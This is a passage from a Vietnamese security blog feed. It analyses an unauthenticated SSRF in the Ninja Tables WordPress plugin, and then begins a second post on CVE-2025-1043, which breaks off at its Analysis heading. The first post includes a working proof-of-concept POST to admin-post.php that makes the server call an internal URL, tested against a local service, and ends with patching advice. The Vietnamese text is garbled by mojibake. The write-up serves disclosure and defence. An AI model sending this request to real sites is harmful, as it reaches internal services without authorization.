class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;ƒêi·ªÅu g√¨ x·∫£y ra n·∫øu &lt;code&gt;$requestMethod&lt;/code&gt; kh√¥ng t·ªìn t·∫°i, t·ª©c &lt;code&gt;$client&lt;/code&gt; g·ªçi ƒë·∫øn m·ªôt ph∆∞∆°ng th·ª©c kh√¥ng c√≥ trong class &lt;code&gt;Client&lt;/code&gt;?&lt;/p&gt;&#xA;&lt;p&gt;Trong tr∆∞·ªùng h·ª£p n√†y, PHP s·∫Ω t·ª± ƒë·ªông g·ªçi &lt;strong&gt;h√†m magic &lt;code&gt;__call()&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c khai b√°o trong class &lt;code&gt;Client&lt;/code&gt;.&#xA;H√†m &lt;code&gt;__call()&lt;/code&gt; ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·ªÉ x·ª≠ l√Ω t·∫•t c·∫£ c√°c l·ªùi g·ªçi ph∆∞∆°ng th·ª©c &lt;strong&gt;kh√¥ng t·ªìn t·∫°i&lt;/strong&gt;, cho ph√©p &lt;code&gt;Client&lt;/code&gt; th·ª±c hi·ªán request ƒë·ªông d·ª±a tr√™n t√™n ph∆∞∆°ng th·ª©c ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;Quan s√°t &lt;strong&gt;Outline tab&lt;/strong&gt; ta th·∫•y ƒë∆∞·ª£c t·∫•t c·∫£ c√°c &lt;strong&gt;method&lt;/strong&gt;, &lt;strong&gt;property&lt;/strong&gt; v√† c√°c &lt;strong&gt;h√†m&lt;/strong&gt; trong file theo th·ª© t·ª±.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/outline.png&#34; title=&#34;Outline c·ªßa file Client.php&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/outline.png&#34; data-sub-html=&#34;&lt;h2&gt;Outline&lt;/h2&gt;&lt;p&gt;Outline c·ªßa file Client.php&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/outline.png&#39; alt=&#34;Outline&#34; height=&#34;969&#34; width=&#34;644&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Outline c·ªßa file Client.php&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __call($method, $args)&#xA;{&#xA;    if ($method === &amp;#39;download&amp;#39;) {&#xA;        return $this-&amp;gt;downloadFile(...$args);&#xA;    }&#xA;    &#xA;    // Handles dynamic method calls like:&#xA;    // asyncGet, asyncPost and so on&#xA;    // get, post and so on&#xA;    $url = array_shift($args);&#xA;&#xA;    $parsed = parse_url($url);&#xA;&#xA;    if (!isset($parsed[&amp;#39;scheme&amp;#39;])) {&#xA;        $url = trim($this-&amp;gt;baseUrl, &amp;#39;/&amp;#39;) . &amp;#39;/&amp;#39; . trim($url, &amp;#39;/&amp;#39;);&#xA;    }&#xA;&#xA;    if (str_starts_with($method, &amp;#39;async&amp;#39;)) {&#xA;        $method = substr($method, strlen(&amp;#39;async&amp;#39;));&#xA;        $this-&amp;gt;checkIfValidHttpMethod($method);&#xA;        return $this-&amp;gt;asyncRequest(&#xA;            $url, $this-&amp;gt;buildRequestArgs($args, $method)&#xA;        );&#xA;    }&#xA;    &#xA;    $this-&amp;gt;checkIfValidHttpMethod($method);&#xA;    return $this-&amp;gt;request(&#xA;        $url, $this-&amp;gt;buildRequestArgs($args, $method)&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;__call()&lt;/code&gt; s·∫Ω g·ªçi ƒë·∫øn &lt;code&gt;request()&lt;/code&gt; n·∫øu method kh√¥ng ph·∫£i &lt;code&gt;download&lt;/code&gt; v√† kh√¥ng b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;async&lt;/code&gt; v·ªõi url ƒë∆∞·ª£c set tr∆∞·ªõc ƒë√≥.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function request($url, $args = [])&#xA;{&#xA;    if ($query = http_build_query($this-&amp;gt;query)) {&#xA;        $url .= &amp;#39;?&amp;#39; . $query;&#xA;    }&#xA;&#xA;    $response = wp_remote_request($url, $args);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        throw new Exception($response-&amp;gt;get_error_message(), 500);&#xA;    }&#xA;    &#xA;    $this-&amp;gt;cookies = array_merge(&#xA;        $this-&amp;gt;cookies,&#xA;        wp_remote_retrieve_cookies($response)&#xA;    );&#xA;&#xA;    return $this-&amp;gt;makeResponse($response);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;request()&lt;/code&gt; th·ª±c hi·ªán &lt;strong&gt;build query&lt;/strong&gt; v√† g·ª≠i request b·∫±ng &lt;code&gt;wp_remote_request()&lt;/code&gt; - h√†m ch√≠nh d·∫´n t·ªõi &lt;strong&gt;SSRF&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;HTTP Request&amp;#34;] --&amp;gt; B[&amp;#34;admin_post_nopriv_{action}&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;$request-&amp;gt;get(&amp;#39;args.url&amp;#39;) / $request-&amp;gt;get(&amp;#39;args.method&amp;#39;)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;$client-&amp;gt;{$requestMethod}(&amp;#39;&amp;#39;, $params)&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Client::__call() ‚Üí request() ‚Üí wp_remote_request() ‚Üê SSRF sink&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Response ‚Üí callback ‚Üí HTTP Response&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;local-server&#34;&gt;&lt;span&gt;Local Server&lt;/span&gt;&#xA;  &lt;a href=&#34;#local-server&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;T·∫°o local service ƒë∆°n gi·∫£n b·∫±ng python&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from flask import Flask, send_from_directory&#xA;import os&#xA;&#xA;BASE_DIR = os.path.abspath(os.getcwd())&#xA;app = Flask(__name__)&#xA;&#xA;@app.route(&amp;#39;/metadata&amp;#39;)&#xA;def metadata():&#xA;    return send_from_directory(BASE_DIR, &amp;#39;metadata.json&amp;#39;, as_attachment=True)&#xA;&#xA;@app.route(&amp;#39;/delete&amp;#39;)&#xA;def delete():&#xA;    file_id = request.args.get(&amp;#39;id&amp;#39;)&#xA;    if not file_id:&#xA;        return &amp;#34;No id provided&amp;#34;, 400&#xA;    print(f&amp;#34;delete it: {file_id}&amp;#34;)&#xA;    return f&amp;#34;Delete it: {file_id}&amp;#34;&#xA;&#xA;if __name__ == &amp;#39;__main__&amp;#39;:&#xA;    app.run(host=&amp;#39;0.0.0.0&amp;#39;, port=8001, debug=True)&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;content&amp;#34;: &amp;#34;Internal service data&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;G·ª≠i POST request v·ªõi URL tr·ªè ƒë·∫øn local service:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-post.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 &#xA;Accept: */*&#xA;Content-Type: application/x-www-form-urlencoded&#xA;Content-Length: 146&#xA;Connection: close&#xA;&#xA;action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[url]=http://localhost:8001/delete?id=1&amp;amp;args[method]=GET&amp;amp;args[name]=Tokuda&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-03-cve-2025-2940/result.png&#34; title=&#34;GET request t·ªõi local service&#34; data-thumbnail=&#34;/posts/2025-11-03-cve-2025-2940/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;GET request t·ªõi local service&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-03-cve-2025-2940/result.png&#39; alt=&#34;Result&#34; height=&#34;275&#34; width=&#34;960&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;GET request t·ªõi local service&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng SSRF trong &lt;strong&gt;Ninja Tables ‚â§ 5.0.18&lt;/strong&gt; cho th·∫•y tham s·ªë &lt;code&gt;args[url]&lt;/code&gt; do client cung c·∫•p ƒë∆∞·ª£c s·ª≠ d·ª•ng tr·ª±c ti·∫øp ƒë·ªÉ th·ª±c hi·ªán request ph√≠a server m√† kh√¥ng ki·ªÉm tra, cho ph√©p attacker (kh√¥ng c·∫ßn x√°c th·ª±c) bu·ªôc ·ª©ng d·ª•ng truy c·∫≠p t·ªõi ƒë·ªãa ch·ªâ t√πy √Ω. B·∫£n v√° &lt;strong&gt;‚â• 5.0.19&lt;/strong&gt; ƒë√£ lo·∫°i b·ªè ƒëo·∫°n m√£ nguy hi·ªÉm v√† kh·∫Øc ph·ª•c vector n√†y.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;N√¢ng c·∫•p ngay l√™n &lt;strong&gt;5.0.19&lt;/strong&gt; ho·∫∑c m·ªõi h∆°n.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng d√πng tr·ª±c ti·∫øp input c·ªßa client l√†m URL cho request ‚Äî validate/normalize tr∆∞·ªõc khi s·ª≠ d·ª•ng.&lt;/li&gt;&#xA;&lt;li&gt;√Åp d·ª•ng allowlist cho host/port v√† ch·∫∑n private IP ranges (127.0.0.0/8, 10.0.0.0/8, 192.168.0.0/16, v.v.).&lt;/li&gt;&#xA;&lt;li&gt;Tr√°nh ƒëƒÉng k√Ω endpoint &lt;code&gt;admin_post_nopriv_*&lt;/code&gt; cho ch·ª©c nƒÉng th·ª±c hi·ªán outbound request ho·∫∑c th√™m ki·ªÉm so√°t quy·ªÅn/CSRF.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SSRF (Server Side Request Forgery) ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ninja-tables/vulnerability/wordpress-ninja-tables-easy-data-table-builder-plugin-5-0-18-unauthenticated-server-side-request-forgery-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables Plugin &amp;lt;= 5.0.18 is vulnerable to Server Side Request Forgery (SSRF)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-1043 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-02-cve-2025-1043/</link>
      <pubDate>Sun, 02 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-02-cve-2025-1043/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-02-cve-2025-1043/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Plugin &amp;ldquo;Embed Any Document ‚Äì Embed PDF, Word, PowerPoint and Excel Files&amp;rdquo;&lt;/strong&gt; cho WordPress c√≥ l·ªó h·ªïng &lt;strong&gt;Server-Side Request Forgery (SSRF)&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm &lt;strong&gt;2.7.5&lt;/strong&gt; th√¥ng qua shortcode &lt;code&gt;&#39;embeddoc&#39;&lt;/code&gt;. L·ªó h·ªïng n√†y cho ph√©p nh·ªØng k·∫ª t·∫•n c√¥ng ƒë√£ x√°c th·ª±c, c√≥ quy·ªÅn truy c·∫≠p ·ªü m·ª©c &lt;strong&gt;Contributor&lt;/strong&gt; tr·ªü l√™n, th·ª±c hi·ªán c√°c y√™u c·∫ßu web t·ªõi c√°c ƒë·ªãa ch·ªâ t√πy √Ω xu·∫•t ph√°t t·ª´ ·ª©ng d·ª•ng web v√† c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ truy v·∫•n v√† s·ª≠a ƒë·ªïi th√¥ng tin t·ª´ c√°c d·ªãch v·ª• n·ªôi b·ªô.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-1043&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-1043&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Server Side Request Forgery (SSRF)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.7.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.7.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (4.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/embed-any-document/advanced/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed Any Document Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Embed Any Document&lt;/strong&gt;: &lt;strong&gt;2.7.5&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;2.7.6&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  